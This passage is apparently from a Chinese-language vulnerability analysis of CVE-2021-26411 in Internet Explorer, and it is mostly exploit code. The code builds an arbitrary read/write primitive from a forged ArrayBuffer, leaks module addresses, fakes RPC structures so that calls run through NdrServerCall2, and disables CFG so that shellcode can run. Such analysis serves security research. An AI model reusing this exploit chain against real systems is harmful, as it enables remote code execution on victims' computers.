src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220219150105031.png" alt="image-20220219150105031"></p><p>ArrayBuffer_data由于前面通过下面这条代码进行初始化,所以其中存储的是Array对象.也是后面要进行伪造的ArrayBuffer对象</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">var</span> fake = <span class="hljs-keyword">new</span> <span class="hljs-type">ArrayBuffer</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-keyword">var</span> fakeArr = <span class="hljs-keyword">new</span> <span class="hljs-type">Uint32Array</span>(fake);<br></code></pre></td></tr></table></figure><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220219160035929.png" alt="image-20220219160035929"></p><p>刷新后,0f0 0f4 10c位置对应着fakebuf的属性</p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220219150207709.png" alt="image-20220219150207709"></p><p>然后通过前面申请的指向fakeBuf的fakeArray对象伪造出一份起始地址为0x0,长度为0xffffffff的ArrayBuffer对象,将bufArr中属性写入fakeArr,并将fake的ArrayBuf虚表指针地址fakeArr[4]位置,</p><p>将fake的一些属性进行替换,并将长度修改为0xffffffff,然后将构造好的ArrayBuffer写入node_value中</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript">ref = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VBArray</span>(hd0.<span class="hljs-property">nodeValue</span>);<br>      <span class="hljs-keyword">var</span> vt = ref.<span class="hljs-title function_">getItem</span>(<span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">var</span> gc = ref.<span class="hljs-title function_">getItem</span>(<span class="hljs-number">2</span>);<br>      <span class="hljs-keyword">var</span> bs = ref.<span class="hljs-title function_">getItem</span>(<span class="hljs-number">3</span>);<br>      ref = <span class="hljs-literal">null</span>;<br>      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; ++i) &#123;<br>          fakeArr[i] = bufArr[i];<br>      &#125;<br>      fakeArr[<span class="hljs-number">4</span>] = bs + <span class="hljs-number">0x40</span>;<br>      fakeArr[<span class="hljs-number">16</span>] = vt;<br>      fakeArr[<span class="hljs-number">17</span>] = gc;<br>      fakeArr[<span class="hljs-number">24</span>] = <span class="hljs-number">0xffffffff</span>;<br>      <span class="hljs-title function_">setData</span>(<span class="hljs-number">1</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Data</span>(<span class="hljs-variable constant_">VT_DISPATCH</span>, bs));<br>      <span class="hljs-title function_">flush</span>();<br></code></pre></td></tr></table></figure><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220219162906665.png" alt="image-20220219162906665"></p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220219162834343.png" alt="image-20220219162834343"></p><p>然后将这个ArrayBuffer解析为dataview对象,就可以实现任意地址读写.然后通过将对象存储至arr[{}],并读取pArr值,实现任意对象地址的读取.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">addrOf</span>(<span class="hljs-params">obj</span>) &#123;<br>           arr[<span class="hljs-number">0</span>] = obj<br>           <span class="hljs-keyword">return</span> <span class="hljs-title function_">read</span>(pArr, <span class="hljs-number">32</span>)<br>       &#125;<br><span class="hljs-title function_">write</span>(<span class="hljs-title function_">read</span>(<span class="hljs-title function_">addrOf</span>(hd0) + <span class="hljs-number">0x18</span>, <span class="hljs-number">32</span>) + <span class="hljs-number">0x28</span>, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>)<br></code></pre></td></tr></table></figure><p>通过任意地址读写泄露模块的基址,通过PE文件结构获取一些函数地址</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>()<br><span class="hljs-keyword">var</span> jscript9 = <span class="hljs-title function_">getBase</span>(<span class="hljs-title function_">read</span>(<span class="hljs-title function_">addrOf</span>(map), <span class="hljs-number">32</span>))<br><span class="hljs-keyword">var</span> rpcrt4 = <span class="hljs-title function_">getDllBase</span>(jscript9, <span class="hljs-string">&#x27;rpcrt4.dll&#x27;</span>)<br><span class="hljs-keyword">var</span> msvcrt = <span class="hljs-title function_">getDllBase</span>(jscript9, <span class="hljs-string">&#x27;msvcrt.dll&#x27;</span>)<br><span class="hljs-keyword">var</span> ntdll = <span class="hljs-title function_">getDllBase</span>(msvcrt, <span class="hljs-string">&#x27;ntdll.dll&#x27;</span>)<br><span class="hljs-keyword">var</span> kernelbase = <span class="hljs-title function_">getDllBase</span>(msvcrt, <span class="hljs-string">&#x27;kernelbase.dll&#x27;</span>)<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">VirtualProtect</span> = <span class="hljs-title function_">getProcAddr</span>(kernelbase, <span class="hljs-string">&#x27;VirtualProtect&#x27;</span>)<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">LoadLibraryExA</span> = <span class="hljs-title function_">getProcAddr</span>(kernelbase, <span class="hljs-string">&#x27;LoadLibraryExA&#x27;</span>)<br></code></pre></td></tr></table></figure><p>而后创建了一个Attribute对象xyz,并覆盖其函数normalize(),修改为NdrServerCall2</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> xyz = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createAttribute</span>(<span class="hljs-string">&#x27;xyz&#x27;</span>)<br><span class="hljs-keyword">var</span> paoi = <span class="hljs-title function_">addrOf</span>(xyz)<br><span class="hljs-keyword">var</span> patt = <span class="hljs-title function_">read</span>(<span class="hljs-title function_">addrOf</span>(xyz) + <span class="hljs-number">0x18</span>, <span class="hljs-number">32</span>)<br>cattr.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">MSHTMLSymbolBuffer</span>, <span class="hljs-string">&#x27;normalize&#x27;</span>, <span class="hljs-title class_">NdrServerCall2</span>)<br></code></pre></td></tr></table></figure><p>RPC_MESSAGE结构,由图中可以看出Handle存放了一个OSF_SCALL虚表指针,Buffer位置存放了远程调用中函数的传参,RpcInterfaceInformation存放了函数接口信息,通过几个结构体包装了函数的信息,最终会指向的是函数的指针.然后最终通过NdrServerCall2进行调用.</p><p><img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220220101724926.png" alt="image-20220220101724926"></p><p> NdrServerCall2接收参数RPC_MESSAGE,内部会调用NdrStubCall2函数</p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220220144905342.png" alt="image-20220220144905342"></p><p>内部在获取RPC_MESSAGE后会对函数偏移进行一些计算,以及参数做一些处理,然后进行函数调用</p><p><img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220220145312328.png" alt="image-20220220145312328"></p><p><img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220220145559823.png" alt="image-20220220145559823"></p><p>第一个值Handle是OSF_SCALL 虚表指针,通过查看其引用,可以通过调用函数I_RpcTransServerNewConnection函数获取到这个虚表指针填充至handle.</p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220220145753553.png" alt="image-20220220145753553"></p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220220145819249.png" alt="image-20220220145819249"></p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220220150046156.png" alt="image-20220220150046156"></p><p>exp中也是这样进行构造的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">aos</span>(<span class="hljs-params"></span>) &#123;<br>          <span class="hljs-keyword">var</span> baseObj = <span class="hljs-title function_">createBase</span>()<br>          <span class="hljs-keyword">var</span> addr = baseObj.<span class="hljs-property">addr</span> + baseObj.<span class="hljs-property">size</span><br>          <span class="hljs-keyword">var</span> I_RpcTransServerNewConnection = <span class="hljs-title function_">getProcAddr</span>(rpcrt4, <span class="hljs-string">&#x27;I_RpcTransServerNewConnection&#x27;</span>)<br>          <span class="hljs-title function_">prepareCall</span>(addr, I_RpcTransServerNewConnection)<br>          <span class="hljs-keyword">return</span> <span class="hljs-title function_">read</span>(<span class="hljs-title function_">read</span>(<span class="hljs-title function_">call</span>(addr) - <span class="hljs-number">0xf8</span>, <span class="hljs-number">32</span>), <span class="hljs-number">32</span>)<br>      &#125;<br><br></code></pre></td></tr></table></figure><p>然后对RPC结构进行初始化</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">initRpc</span>(<span class="hljs-params"></span>) &#123;<br>           <span class="hljs-keyword">var</span> data = [<span class="hljs-number">50</span>, <span class="hljs-number">72</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">52</span>, <span class="hljs-number">0</span>, <span class="hljs-number">192</span>, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>, <span class="hljs-number">0</span>, <span class="hljs-number">68</span>, <span class="hljs-number">13</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">72</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">72</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">72</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">72</span>, <span class="hljs-number">0</span>, <span class="hljs-number">12</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">72</span>, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">72</span>, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">72</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">72</span>, <span class="hljs-number">0</span>, <span class="hljs-number">28</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">72</span>, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">72</span>, <span class="hljs-number">0</span>, <span class="hljs-number">36</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">72</span>, <span class="hljs-number">0</span>, <span class="hljs-number">40</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">72</span>, <span class="hljs-number">0</span>, <span class="hljs-number">44</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">112</span>, <span class="hljs-number">0</span>, <span class="hljs-number">48</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]<br>           <span class="hljs-keyword">var</span> <span class="hljs-title class_">NdrServerCall2</span> = <span class="hljs-title function_">getProcAddr</span>(rpcrt4, <span class="hljs-string">&#x27;NdrServerCall2&#x27;</span>)<br>           <span class="hljs-keyword">var</span> <span class="hljs-title class_">NdrOleAllocate</span> = <span class="hljs-title function_">getProcAddr</span>(rpcrt4, <span class="hljs-string">&#x27;NdrOleAllocate&#x27;</span>)<br>           <span class="hljs-keyword">var</span> <span class="hljs-title class_">NdrOleFree</span> = <span class="hljs-title function_">getProcAddr</span>(rpcrt4, <span class="hljs-string">&#x27;NdrOleFree&#x27;</span>)<br>           <span class="hljs-keyword">var</span> <span class="hljs-title class_">RPCMessageObject</span> = <span class="hljs-title function_">createArrayBuffer</span>(cbase.<span class="hljs-title function_">size</span>())<br>           <span class="hljs-keyword">var</span> buffer = <span class="hljs-title function_">createArrayBuffer</span>(<span class="hljs-number">0x100</span>)<br>           <span class="hljs-keyword">var</span> buffer2 = <span class="hljs-title function_">createArrayBuffer</span>(<span class="hljs-number">0x200</span>)<br>           <span class="hljs-keyword">var</span> <span class="hljs-title class_">AttributeVtable</span> = <span class="hljs-title function_">read</span>(patt, <span class="hljs-number">32</span>)<br>           <span class="hljs-keyword">var</span> <span class="hljs-title class_">MSHTMLSymbolBuffer</span> = <span class="hljs-title function_">createArrayBuffer</span>(<span class="hljs-number">0x1000</span>)<br>           <span class="hljs-keyword">var</span> <span class="hljs-title class_">TransferSyntaxBuffer</span> = <span class="hljs-title function_">createArrayBuffer</span>(syntaxObject.<span class="hljs-title function_">size</span>())<br>           <span class="hljs-keyword">var</span> PRPC_CLIENT_INTERFACE_Buffer = <span class="hljs-title function_">createArrayBuffer</span>(<span class="hljs-variable constant_">PRPC_CLIENT_INTERFACE</span>.<span class="hljs-title function_">size</span>())<br>           <span class="hljs-keyword">var</span> _MIDL_SERVER_INFO_Buffer = <span class="hljs-title function_">createArrayBuffer</span>(_MIDL_SERVER_INFO_.<span class="hljs-title function_">size</span>())<br>           <span class="hljs-keyword">var</span> rpcProcStringBuffer = <span class="hljs-title function_">createArrayBuffer</span>(data.<span class="hljs-property">length</span>)<br>           <span class="hljs-title function_">writeData</span>(rpcProcStringBuffer, data)<br>           <span class="hljs-keyword">var</span> _MIDL_STUB_DESC_Buffer = <span class="hljs-title function_">createArrayBuffer</span>(_MIDL_STUB_DESC.<span class="hljs-title function_">size</span>())<br>           <span class="hljs-keyword">var</span> RPC_DISPATCH_TABLE_Buffer = <span class="hljs-title function_">createArrayBuffer</span>(<span class="hljs-variable constant_">RPC_DISPATCH_TABLE</span>.<span class="hljs-title function_">size</span>())<br>           <span class="hljs-keyword">var</span> <span class="hljs-title class_">NdrServerCall2Buffer</span> = <span class="hljs-title function_">createArrayBuffer</span>(<span class="hljs-number">4</span>)<br>           <span class="hljs-title function_">write</span>(<span class="hljs-title class_">NdrServerCall2Buffer</span>, <span class="hljs-title class_">NdrServerCall2</span>, <span class="hljs-number">32</span>)<br>           <span class="hljs-title function_">write</span>(<span class="hljs-title class_">MSHTMLSymbolBuffer</span>, osf_vft, <span class="hljs-number">32</span>)<br>           <span class="hljs-title function_">write</span>(<span class="hljs-title class_">MSHTMLSymbolBuffer</span> + <span class="hljs-number">4</span>, <span class="hljs-number">0x89abcdef</span>, <span class="hljs-number">32</span>)<br>           <span class="hljs-title function_">write</span>(<span class="hljs-title class_">MSHTMLSymbolBuffer</span> + <span class="hljs-number">8</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">32</span>)<br>           cattr.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">MSHTMLSymbolBuffer</span>, <span class="hljs-string">&#x27;__vtguard&#x27;</span>, cattr.<span class="hljs-title function_">get</span>(<span class="hljs-title class_">AttributeVtable</span>, <span class="hljs-string">&#x27;__vtguard&#x27;</span>))<br>           cattr.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">MSHTMLSymbolBuffer</span>, <span class="hljs-string">&#x27;SecurityContext&#x27;</span>, cattr.<span class="hljs-title function_">get</span>(<span class="hljs-title class_">AttributeVtable</span>, <span class="hljs-string">&#x27;SecurityContext&#x27;</span>))<br>           cattr.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">MSHTMLSymbolBuffer</span>, <span class="hljs-string">&#x27;JSBind_InstanceOf&#x27;</span>, cattr.<span class="hljs-title function_">get</span>(<span class="hljs-title class_">AttributeVtable</span>, <span class="hljs-string">&#x27;JSBind_InstanceOf&#x27;</span>))<br>           cattr.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">MSHTMLSymbolBuffer</span>, <span class="hljs-string">&#x27;JSBind_TypeId&#x27;</span>, cattr.<span class="hljs-title function_">get</span>(<span class="hljs-title class_">AttributeVtable</span>, <span class="hljs-string">&#x27;JSBind_TypeId&#x27;</span>))<br>           cattr.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">MSHTMLSymbolBuffer</span>, <span class="hljs-string">&#x27;normalize&#x27;</span>, <span class="hljs-title class_">NdrServerCall2</span>)<br>           cbase.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">RPCMessageObject</span>, <span class="hljs-string">&#x27;pSecurityContext&#x27;</span>, <span class="hljs-title class_">RPCMessageObject</span> + <span class="hljs-number">68</span>)<br>           <span class="hljs-title function_">write</span>(<span class="hljs-title class_">RPCMessageObject</span> + <span class="hljs-number">76</span>, <span class="hljs-number">1</span>, <span class="hljs-number">32</span>)<br>           syntaxObject.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">TransferSyntaxBuffer</span>, <span class="hljs-string">&#x27;SyntaxVersion.MajorVersion&#x27;</span>, <span class="hljs-number">2</span>)<br>           _MIDL_STUB_DESC.<span class="hljs-title function_">set</span>(_MIDL_STUB_DESC_Buffer, <span class="hljs-string">&#x27;RpcInterfaceInformation&#x27;</span>, PRPC_CLIENT_INTERFACE_Buffer)<br>           _MIDL_STUB_DESC.<span class="hljs-title function_">set</span>(_MIDL_STUB_DESC_Buffer, <span class="hljs-string">&#x27;pfnAllocate&#x27;</span>, <span class="hljs-title class_">NdrOleAllocate</span>)<br>           _MIDL_STUB_DESC.<span class="hljs-title function_">set</span>(_MIDL_STUB_DESC_Buffer, <span class="hljs-string">&#x27;pfnFree&#x27;</span>, <span class="hljs-title class_">NdrOleFree</span>)<br>           _MIDL_STUB_DESC.<span class="hljs-title function_">set</span>(_MIDL_STUB_DESC_Buffer, <span class="hljs-string">&#x27;pFormatTypes&#x27;</span>, buffer2)<br>           _MIDL_STUB_DESC.<span class="hljs-title function_">set</span>(_MIDL_STUB_DESC_Buffer, <span class="hljs-string">&#x27;fCheckBounds&#x27;</span>, <span class="hljs-number">1</span>)<br>           _MIDL_STUB_DESC.<span class="hljs-title function_">set</span>(_MIDL_STUB_DESC_Buffer, <span class="hljs-string">&#x27;Version&#x27;</span>, <span class="hljs-number">0x50002</span>)<br>           _MIDL_STUB_DESC.<span class="hljs-title function_">set</span>(_MIDL_STUB_DESC_Buffer, <span class="hljs-string">&#x27;MIDLVersion&#x27;</span>, <span class="hljs-number">0x800025b</span>)<br>           _MIDL_STUB_DESC.<span class="hljs-title function_">set</span>(_MIDL_STUB_DESC_Buffer, <span class="hljs-string">&#x27;mFlags&#x27;</span>, <span class="hljs-number">1</span>)<br>           _MIDL_SERVER_INFO_.<span class="hljs-title function_">set</span>(_MIDL_SERVER_INFO_Buffer, <span class="hljs-string">&#x27;pStubDesc&#x27;</span>, _MIDL_STUB_DESC_Buffer)<br>           _MIDL_SERVER_INFO_.<span class="hljs-title function_">set</span>(_MIDL_SERVER_INFO_Buffer, <span class="hljs-string">&#x27;DispatchTable&#x27;</span>, <span class="hljs-title function_">createArrayBuffer</span>(<span class="hljs-number">32</span>))<br>           _MIDL_SERVER_INFO_.<span class="hljs-title function_">set</span>(_MIDL_SERVER_INFO_Buffer, <span class="hljs-string">&#x27;ProcString&#x27;</span>, rpcProcStringBuffer)<br>           _MIDL_SERVER_INFO_.<span class="hljs-title function_">set</span>(_MIDL_SERVER_INFO_Buffer, <span class="hljs-string">&#x27;FmtStringOffset&#x27;</span>, buffer2)<br>           <span class="hljs-variable constant_">RPC_DISPATCH_TABLE</span>.<span class="hljs-title function_">set</span>(RPC_DISPATCH_TABLE_Buffer, <span class="hljs-string">&#x27;DispatchTableCount&#x27;</span>, <span class="hljs-number">1</span>)<br>           <span class="hljs-variable constant_">RPC_DISPATCH_TABLE</span>.<span class="hljs-title function_">set</span>(RPC_DISPATCH_TABLE_Buffer, <span class="hljs-string">&#x27;DispatchTable&#x27;</span>, <span class="hljs-title class_">NdrServerCall2Buffer</span>)<br>           <span class="hljs-variable constant_">PRPC_CLIENT_INTERFACE</span>.<span class="hljs-title function_">set</span>(PRPC_CLIENT_INTERFACE_Buffer, <span class="hljs-string">&#x27;DispatchTable&#x27;</span>, RPC_DISPATCH_TABLE_Buffer)<br>           <span class="hljs-variable constant_">PRPC_CLIENT_INTERFACE</span>.<span class="hljs-title function_">set</span>(PRPC_CLIENT_INTERFACE_Buffer, <span class="hljs-string">&#x27;InterpreterInfo&#x27;</span>, _MIDL_SERVER_INFO_Buffer)<br>           <span class="hljs-variable constant_">PRPC_CLIENT_INTERFACE</span>.<span class="hljs-title function_">set</span>(PRPC_CLIENT_INTERFACE_Buffer, <span class="hljs-string">&#x27;Length&#x27;</span>, <span class="hljs-variable constant_">PRPC_CLIENT_INTERFACE</span>.<span class="hljs-title function_">size</span>())<br>           <span class="hljs-variable constant_">PRPC_CLIENT_INTERFACE</span>.<span class="hljs-title function_">set</span>(PRPC_CLIENT_INTERFACE_Buffer, <span class="hljs-string">&#x27;InterfaceId.SyntaxVersion.MajorVersion&#x27;</span>, <span class="hljs-number">1</span>)<br>           <span class="hljs-variable constant_">PRPC_CLIENT_INTERFACE</span>.<span class="hljs-title function_">set</span>(PRPC_CLIENT_INTERFACE_Buffer, <span class="hljs-string">&#x27;TransferSyntax.SyntaxVersion.MajorVersion&#x27;</span>, <span class="hljs-number">2</span>)<br>           <span class="hljs-variable constant_">PRPC_CLIENT_INTERFACE</span>.<span class="hljs-title function_">set</span>(PRPC_CLIENT_INTERFACE_Buffer, <span class="hljs-string">&#x27;Flags&#x27;</span>, <span class="hljs-number">0x4000000</span>)<br>           _RPC_MESSAGE.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">RPCMessageObject</span>, <span class="hljs-string">&#x27;RpcInterfaceInformation&#x27;</span>, PRPC_CLIENT_INTERFACE_Buffer)<br>           _RPC_MESSAGE.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">RPCMessageObject</span>, <span class="hljs-string">&#x27;TransferSyntax&#x27;</span>, <span class="hljs-title class_">TransferSyntaxBuffer</span>)<br>           _RPC_MESSAGE.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">RPCMessageObject</span>, <span class="hljs-string">&#x27;Handle&#x27;</span>, <span class="hljs-title class_">MSHTMLSymbolBuffer</span>)<br>           _RPC_MESSAGE.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">RPCMessageObject</span>, <span class="hljs-string">&#x27;DataRepresentation&#x27;</span>, <span class="hljs-number">16</span>)<br>           _RPC_MESSAGE.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">RPCMessageObject</span>, <span class="hljs-string">&#x27;RpcFlags&#x27;</span>, <span class="hljs-number">0x1000</span>)<br>           _RPC_MESSAGE.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">RPCMessageObject</span>, <span class="hljs-string">&#x27;Buffer&#x27;</span>, buffer)<br>           _RPC_MESSAGE.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">RPCMessageObject</span>, <span class="hljs-string">&#x27;BufferLength&#x27;</span>, <span class="hljs-number">48</span>)<br>           <span class="hljs-keyword">return</span> <span class="hljs-title class_">RPCMessageObject</span><br>       &#125;<br></code></pre></td></tr></table></figure><p>通过覆盖rpcrt4_guard_check_icall_fptr中保存的函数指针,修改为KiFastSystemCallRet关闭CFG保护.使其可以跳转到shellcode.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">killCfg</span>(<span class="hljs-params">addr</span>) &#123;<br>      <span class="hljs-keyword">var</span> cfgobj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CFGObject</span>(addr)<br>      <span class="hljs-keyword">if</span> (!cfgobj.<span class="hljs-title function_">getCFGValue</span>()) <span class="hljs-keyword">return</span><br>      <span class="hljs-keyword">var</span> guard_check_icall_fptr_address = cfgobj.<span class="hljs-title function_">getCFGAddress</span>()<br>      <span class="hljs-keyword">var</span> <span class="hljs-title class_">KiFastSystemCallRet</span> = <span class="hljs-title function_">getProcAddr</span>(ntdll, <span class="hljs-string">&#x27;KiFastSystemCallRet&#x27;</span>)<br>      <span class="hljs-keyword">var</span> tmpBuffer = <span class="hljs-title function_">createArrayBuffer</span>(<span class="hljs-number">4</span>)<br>      <span class="hljs-comment">// 修改RPCRT4!__guard_check_icall_fptr的属性为PAGE_EXECUTE_READWRITE</span><br>      <span class="hljs-title function_">call2</span>(<span class="hljs-title class_">VirtualProtect</span>, [guard_check_icall_fptr_address, <span class="hljs-number">0x1000</span>, <span class="hljs-number">0x40</span>, tmpBuffer])<br>      <span class="hljs-comment">// 替换rpcrt4!__guard_check_icall_fptr保存的指针，修改ntdll!LdrpValidateUserCallTarget为改为ntdll!KiFastSystemCallRet</span><br>      <span class="hljs-comment">// 关闭rpcrt4的CFG检查</span><br>      <span class="hljs-title function_">write</span>(guard_check_icall_fptr_address, <span class="hljs-title class_">KiFastSystemCallRet</span>, <span class="hljs-number">32</span>)<br>      <span class="hljs-comment">// 恢复PRCRT4!__gurad_check_icall_fptr内存属性</span><br>      <span class="hljs-title function_">call2</span>(<span class="hljs-title class_">VirtualProtect</span>, [guard_check_icall_fptr_address, <span class="hljs-number">0x1000</span>, <span class="hljs-title function_">read</span>(tmpBuffer, <span class="hljs-number">32</span>), tmpBuffer])<br>      map.<span class="hljs-title function_">delete</span>(tmpBuffer)<br>  